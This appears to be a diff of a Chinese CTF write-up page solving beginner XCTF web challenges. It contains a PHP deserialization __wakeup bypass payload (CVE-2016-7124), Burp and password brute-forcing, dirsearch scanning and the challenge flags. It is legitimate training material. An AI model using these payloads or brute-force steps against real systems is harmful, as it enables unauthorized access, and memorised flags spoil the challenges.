+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">class</span> <span style="color:#f3f99d">xctf</span>{
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">public</span> <span style="color:#ff5c57">$flag</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;111&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">public</span> <span style="color:#ff6ac1">function</span> <span style="color:#57c7ff">__wakeup</span>(){
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">exit</span>(<span style="color:#5af78e">&#39;bad requests&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">?</span>code<span style="color:#ff6ac1">=</span></span></span></code></pre></div><p>PHP反序列化漏洞场景(CVE-2016-7124)，分析</p>
+<ul>
+<li><code>$flag = '111';</code>是类中的一个属性</li>
+<li><code>function __wakeup()</code>是魔术方法，<code>unserialize()</code>反序列化函数会检查是否存在<code>__wakeup</code>方法，如果存在，则会先调用<code>__wakeup</code>方法</li>
+<li><code>exit('bad requests');</code>这里的<code>__wakeup</code>起到了防御作用，一旦尝试反序列化这个类，它会直接终止程序，防止后续代码执行</li>
+<li>目前的代码无序列化函数(即：<code>serialize()</code>函数，能将内存中的对象转为文本，触发魔术方法：<code>__sleep()</code>如果存在)，所以传递参数的时候需要<strong>自己传递已经序列化的参数</strong>，题目提示，传参给code</li>
+</ul>
+<p>打开phpstudy，安装<code>php5.4.45nts</code>，localhost网站选择这个php版本，接着在<code>/WWW</code>目录下创建<code>serialize.php</code>文件，内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">class</span> <span style="color:#f3f99d">xctf</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">public</span> <span style="color:#ff5c57">$flag</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;111&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">public</span> <span style="color:#ff6ac1">function</span> <span style="color:#57c7ff">__wakeup</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">exit</span>(<span style="color:#5af78e">&#39;bad requests&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$x</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> xctf(); <span style="color:#78787e">// 创建新对象（实例化）
+</span></span></span><span style="display:flex;"><span><span style="color:#ff6ac1">echo</span>(serialize(<span style="color:#ff5c57">$x</span>)); <span style="color:#78787e">// 对对象序列化输出
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
 </span></span></span></code></pre></div><p><code>$x</code>是变量名指向内存中刚刚创建出来的哪个对象
 而<code>new</code>是关键字，告诉php引擎去内存开启一片空间用于创建一个新的对象实例
 <code>xctf()</code>是类名，告诉<code>new</code>用xctf这张图纸来创建对象，括号<code>()</code>代表调用该类的构造函数
-因此<code>$x = new xctf();</code>产生了一个包含<code>$flag = '111'</code>数据的对象实体，<code>serialize($x)</code>才能把这个实体转成字符串<code>0:4:"xctf":1:{...}</code></p><p>URL中输入<code>localhost/serialize.php</code>获得如下结果：<code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code>，为序列化后的结果</p><table><thead><tr><th>序列化片段</th><th>对应PHP代码成分</th><th>说明</th></tr></thead><tbody><tr><td><code>O:4:"xctf"</code></td><td><code>class xctf</code></td><td>标识这个对象属于哪个类</td></tr><tr><td><code>:1:</code></td><td>属性数量即这里只有一个变量<code>$flag</code></td><td>统计类中有多少变量</td></tr><tr><td><code>s:4:"flag"</code></td><td><code>public $flag</code></td><td>记录变量名字</td></tr><tr><td><code>s:3:"111"</code></td><td><code>= '111'</code></td><td>记录变量此时的值</td></tr></tbody></table><p>接着在漏洞场景的URL后加上<code>/?code=O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code>
+因此<code>$x = new xctf();</code>产生了一个包含<code>$flag = '111'</code>数据的对象实体，<code>serialize($x)</code>才能把这个实体转成字符串<code>0:4:&quot;xctf&quot;:1:{...}</code></p>
+<p>URL中输入<code>localhost/serialize.php</code>获得如下结果：<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，为序列化后的结果</p>
+<table>
+  <thead>
+      <tr>
+          <th>序列化片段</th>
+          <th>对应PHP代码成分</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>O:4:&quot;xctf&quot;</code></td>
+          <td><code>class xctf</code></td>
+          <td>标识这个对象属于哪个类</td>
+      </tr>
+      <tr>
+          <td><code>:1:</code></td>
+          <td>属性数量即这里只有一个变量<code>$flag</code></td>
+          <td>统计类中有多少变量</td>
+      </tr>
+      <tr>
+          <td><code>s:4:&quot;flag&quot;</code></td>
+          <td><code>public $flag</code></td>
+          <td>记录变量名字</td>
+      </tr>
+      <tr>
+          <td><code>s:3:&quot;111&quot;</code></td>
+          <td><code>= '111'</code></td>
+          <td>记录变量此时的值</td>
+      </tr>
+  </tbody>
+</table>
+<p>接着在漏洞场景的URL后加上<code>/?code=O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>
 得到的结果是<code>bad requests</code>，因此，输入这段字符，被反序列化调用了魔法函数，我们需要绕过反序列化
-这里的漏洞是：如果在序列化中说明的对象个数要比实际的对象个数大，那么将不会执行<code>__wakeup()</code>方法，所以把序列化输出的对象个数改为3，即<code>/?code=O:4:"xctf":3:{s:4:"flag";s:3:"111";}</code>
-获得flag：<code>cyberpeace{fbe3a1688219ef9504c05c3be88fef90}</code></p><p>涉及的知识：
+这里的漏洞是：如果在序列化中说明的对象个数要比实际的对象个数大，那么将不会执行<code>__wakeup()</code>方法，所以把序列化输出的对象个数改为3，即<code>/?code=O:4:&quot;xctf&quot;:3:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>
+获得flag：<code>cyberpeace{fbe3a1688219ef9504c05c3be88fef90}</code></p>
+<p>涉及的知识：
 当对象被序列化时，会将对象的属性和属性值存储在序列化的字符串中。
 当使用unserialize()函数对序列化的字符串进行反序列化时，PHP会尝试将存储的属性和属性值重新赋值给对象。
-当属性个数变大时，PHP的底层逻辑会认为对象已损坏从而跳过魔术方法，但它依然会尽力完成对象的实例化</p><p><strong>流程梳理：</strong></p><ol><li>漏洞分析
+当属性个数变大时，PHP的底层逻辑会认为对象已损坏从而跳过魔术方法，但它依然会尽力完成对象的实例化</p>
+<p><strong>流程梳理：</strong></p>
+<ol>
+<li>漏洞分析
 类中定义的<code>__wakeup()</code>魔术方法包含<code>exit()</code>，会在<code>unserialize()</code>执行时立即终止程序
-而在特定的php版本中，若序列化字符串中表示属性个数的数字大于实际属性个数，PHP会体哦爱国<code>__wakeup()</code>的执行</li><li>本地payload生成
-phpstudy的<code>WWW</code>目录下创建<code>serialize.php</code>，访问<code>localhost/serialize.php</code>得到标准序列化字符串<code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></li><li>构造并提交payload
-将字符串中的属性个数<code>1</code>改为<code>3</code>，最终传参<code>?code=O:4:"xctf":3:{s:4:"flag";s:3:"111";}</code>，得到flag</li></ol><h2 id=14-ics-06字典爆破>1.4 ics-06（字典爆破）<a class=anchor href=#14-ics-06%e5%ad%97%e5%85%b8%e7%88%86%e7%a0%b4>#</a></h2><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。
+而在特定的php版本中，若序列化字符串中表示属性个数的数字大于实际属性个数，PHP会体哦爱国<code>__wakeup()</code>的执行</li>
+<li>本地payload生成
+phpstudy的<code>WWW</code>目录下创建<code>serialize.php</code>，访问<code>localhost/serialize.php</code>得到标准序列化字符串<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></li>
+<li>构造并提交payload
+将字符串中的属性个数<code>1</code>改为<code>3</code>，最终传参<code>?code=O:4:&quot;xctf&quot;:3:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，得到flag</li>
+</ol>
+<h2 id="14-ics-06字典爆破">1.4 ics-06（字典爆破）<a class="anchor" href="#14-ics-06%e5%ad%97%e5%85%b8%e7%88%86%e7%a0%b4">#</a></h2>
+<p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。
 关闭梯子，开启burp suite截取信息，对id=1，这里的<code>1</code>注入payload，字典选择数值，从1到3000，最后结果2333有异常，放入重放器，尝试，获得flag
-<code>cyberpeace{4f1481b62f05cd876e8e8485ae75ff92}</code></p><h2 id=15-get_postgetpost>1.5 get_post（GET/POST）<a class=anchor href=#15-get_postgetpost>#</a></h2><p>问题描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？
+<code>cyberpeace{4f1481b62f05cd876e8e8485ae75ff92}</code></p>
+<h2 id="15-get_postgetpost">1.5 get_post（GET/POST）<a class="anchor" href="#15-get_postgetpost">#</a></h2>
+<p>问题描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？
 进入页面提示，用GET方式提交a=1的变量，因此URL中加入<code>/?a=1</code>
 再次提示，用POST方式提交b=2的变量，burp suite抓包
-得到：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-HTTP data-lang=HTTP><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span><span style=color:#d2a8ff;font-weight:700>GET</span> <span style=color:#ff7b72>/?a=1</span> <span style=color:#ff7b72>HTTP</span><span style=color:#ff7b72;font-weight:700>/</span><span style=color:#a5d6ff>1.1</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>Host<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>61.147.171.35:65149</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>Cache-Control<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>max-age=0</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>Upgrade-Insecure-Requests<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>1</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>User-Agent<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">6</span><span>Accept<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">7</span><span>Accept-Encoding<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>gzip, deflate, br</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">8</span><span>Accept-Language<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">9</span><span>Connection<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>keep-alive</span></span></span></code></pre></div><p>修改为</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-HTTP data-lang=HTTP><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span><span style=color:#d2a8ff;font-weight:700>POST</span> <span style=color:#ff7b72>/?a=1</span> <span style=color:#ff7b72>HTTP</span><span style=color:#ff7b72;font-weight:700>/</span><span style=color:#a5d6ff>1.1</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span>Host<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>61.147.171.35:61795</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>Cache-Control<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>max-age=0</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span>Upgrade-Insecure-Requests<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>1</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>User-Agent<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>Accept<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>Accept-Encoding<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>gzip, deflate, br</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>Accept-Language<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span>Connection<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>keep-alive</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>Content-Type<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>application/x-www-form-urlencoded</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>Content-Length<span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>3</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span>b=2</span></span></code></pre></div><p>获得flag：<code>cyberpeace{cdea20b31dcec8d40913cde1a93142b7}</code></p><p>知识总结</p><ul><li>GET参数本质上是URL的一部分</li><li>POST参数本质上是HTTP报文体(Body)的内容</li></ul><h2 id=16-backup目录扫描>1.6 backup（目录扫描）<a class=anchor href=#16-backup%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8f>#</a></h2><p>问题：你知道index.php的备份文件名吗？
-<code>index.php~</code>，但是也让我想起了目录扫描，或许是这类题目最好的解决</p><p>flag：<code>Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}</code></p><p>进入kali linux，设置成nat模式，使用dirsearch
-<code>dirsearch -u http://目标ip:/端口 -e php,bak,zip</code></p><h2 id=17-cookie>1.7 cookie<a class=anchor href=#17-cookie>#</a></h2><p>F12 → 应用程序 → 存储 → Cookie，获得cookie.php
-URL打开，提示<code>See the http response</code>，接着打开网络，查看名为<code>cookie.php</code>的标头，找到flag：<code>cyberpeace{ff3da7e18b1452120c8cbc91631baf6d}</code></p><h2 id=18-disabled_buttonhtml源码修改>1.8 disabled_button（HTML源码修改）<a class=anchor href=#18-disabled_buttonhtml%e6%ba%90%e7%a0%81%e4%bf%ae%e6%94%b9>#</a></h2><p>按钮灰色，无法点击</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-HTML data-lang=HTML><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>&lt;<span style=color:#7ee787>input</span> disabled<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;&#34;</span> class<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;btn btn-default&#34;</span> style<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;height:50px;width:200px;&#34;</span> type<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;submit&#34;</span> value<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;flag&#34;</span> name<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;auth&#34;</span>&gt;</span></span></code></pre></div><p>F12，删除源码中的<code>disabled</code>，获得flag<code>cyberpeace{4d9aa48a8e093c41754d2ebee53f8a39}</code>
-原理是：HTML在浏览器是本地渲染的</p><h2 id=19-weak_auth字典爆破>1.9 weak_auth（字典爆破）<a class=anchor href=#19-weak_auth%e5%ad%97%e5%85%b8%e7%88%86%e7%a0%b4>#</a></h2><p>随便输入账户密码，提示账户名为<code>admin</code>！
-对密码进行爆破，得到密码为<code>123456</code></p><h2 id=110-simple_phpphp源码审计>1.10 simple_php（php源码审计）<a class=anchor href=#110-simple_phpphp%e6%ba%90%e7%a0%81%e5%ae%a1%e8%ae%a1>#</a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-PHP data-lang=PHP><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span><span style=color:#ff7b72;font-weight:700>&lt;?</span>php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span>show_source(<span style=color:#79c0ff;font-weight:700>__FILE__</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span><span style=color:#ff7b72>include</span>(<span style=color:#a5d6ff>&#34;config.php&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span><span style=color:#79c0ff>$a</span><span style=color:#ff7b72;font-weight:700>=@</span><span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#39;a&#39;</span>];
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span><span style=color:#79c0ff>$b</span><span style=color:#ff7b72;font-weight:700>=@</span><span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#39;b&#39;</span>];
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span><span style=color:#ff7b72>if</span>(<span style=color:#79c0ff>$a</span><span style=color:#ff7b72;font-weight:700>==</span><span style=color:#a5d6ff>0</span> <span style=color:#ff7b72>and</span> <span style=color:#79c0ff>$a</span>){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>    <span style=color:#ff7b72>echo</span> <span style=color:#79c0ff>$flag1</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span><span style=color:#ff7b72>if</span>(is_numeric(<span style=color:#79c0ff>$b</span>)){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>    <span style=color:#ff7b72>exit</span>();
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span><span style=color:#ff7b72>if</span>(<span style=color:#79c0ff>$b</span><span style=color:#ff7b72;font-weight:700>&gt;</span><span style=color:#a5d6ff>1234</span>){
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span>    <span style=color:#ff7b72>echo</span> <span style=color:#79c0ff>$flag2</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">14</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">15</span><span><span style=color:#8b949e;font-weight:700;font-style:italic>?&gt;</span><span style=color:#f85149>
+得到：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#57c7ff">GET</span> /?a=1 <span style="color:#ff6ac1">HTTP</span><span style="color:#ff6ac1">/</span><span style="color:#ff9f43">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#ff6ac1">:</span> 61.147.171.35:65149
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#ff6ac1">:</span> max-age=0
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#ff6ac1">:</span> 1
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#ff6ac1">:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#ff6ac1">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#ff6ac1">:</span> gzip, deflate, br
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#ff6ac1">:</span> zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff6ac1">:</span> keep-alive</span></span></code></pre></div><p>修改为</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#57c7ff">POST</span> /?a=1 <span style="color:#ff6ac1">HTTP</span><span style="color:#ff6ac1">/</span><span style="color:#ff9f43">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#ff6ac1">:</span> 61.147.171.35:61795
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#ff6ac1">:</span> max-age=0
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#ff6ac1">:</span> 1
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#ff6ac1">:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#ff6ac1">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#ff6ac1">:</span> gzip, deflate, br
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#ff6ac1">:</span> zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff6ac1">:</span> keep-alive
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff6ac1">:</span> application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#ff6ac1">:</span> 3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>b=2</span></span></code></pre></div><p>获得flag：<code>cyberpeace{cdea20b31dcec8d40913cde1a93142b7}</code></p>
+<p>知识总结</p>
+<ul>
+<li>GET参数本质上是URL的一部分</li>
+<li>POST参数本质上是HTTP报文体(Body)的内容</li>
+</ul>
+<h2 id="16-backup目录扫描">1.6 backup（目录扫描）<a class="anchor" href="#16-backup%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8f">#</a></h2>
+<p>问题：你知道index.php的备份文件名吗？
+<code>index.php~</code>，但是也让我想起了目录扫描，或许是这类题目最好的解决</p>
+<p>flag：<code>Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}</code></p>
+<p>进入kali linux，设置成nat模式，使用dirsearch
+<code>dirsearch -u http://目标ip:/端口 -e php,bak,zip</code></p>
+<h2 id="17-cookie">1.7 cookie<a class="anchor" href="#17-cookie">#</a></h2>
+<p>F12 → 应用程序 → 存储 → Cookie，获得cookie.php
+URL打开，提示<code>See the http response</code>，接着打开网络，查看名为<code>cookie.php</code>的标头，找到flag：<code>cyberpeace{ff3da7e18b1452120c8cbc91631baf6d}</code></p>
+<h2 id="18-disabled_buttonhtml源码修改">1.8 disabled_button（HTML源码修改）<a class="anchor" href="#18-disabled_buttonhtml%e6%ba%90%e7%a0%81%e4%bf%ae%e6%94%b9">#</a></h2>
+<p>按钮灰色，无法点击</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">input</span> <span style="color:#57c7ff">disabled</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;&#34;</span> <span style="color:#57c7ff">class</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;btn btn-default&#34;</span> <span style="color:#57c7ff">style</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;height:50px;width:200px;&#34;</span> <span style="color:#57c7ff">type</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;submit&#34;</span> <span style="color:#57c7ff">value</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;flag&#34;</span> <span style="color:#57c7ff">name</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;auth&#34;</span>&gt;</span></span></code></pre></div><p>F12，删除源码中的<code>disabled</code>，获得flag<code>cyberpeace{4d9aa48a8e093c41754d2ebee53f8a39}</code>
+原理是：HTML在浏览器是本地渲染的</p>
+<h2 id="19-weak_auth字典爆破">1.9 weak_auth（字典爆破）<a class="anchor" href="#19-weak_auth%e5%ad%97%e5%85%b8%e7%88%86%e7%a0%b4">#</a></h2>
+<p>随便输入账户密码，提示账户名为<code>admin</code>！
+对密码进行爆破，得到密码为<code>123456</code></p>
+<h2 id="110-simple_phpphp源码审计">1.10 simple_php（php源码审计）<a class="anchor" href="#110-simple_phpphp%e6%ba%90%e7%a0%81%e5%ae%a1%e8%ae%a1">#</a></h2>
